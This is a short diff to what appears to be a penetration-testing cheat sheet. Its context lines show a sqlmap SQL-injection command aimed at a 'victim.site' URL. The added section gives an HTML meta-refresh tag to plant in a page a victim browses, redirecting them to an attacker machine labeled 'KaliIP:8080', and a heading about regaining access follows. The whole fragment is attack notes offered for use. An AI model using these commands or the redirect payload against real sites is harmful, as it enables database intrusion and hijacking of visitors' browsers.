@@ -911,4 +911,8 @@ db_rebuild_cache
 ```
 sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
 ```
+## Website redirects (put this in the html site vitcim is browsing)
+```
+<meta http-equiv="refresh" content="0; url=http://KaliIP:8080/" />
+```
 ## How to replicate to gain access again:
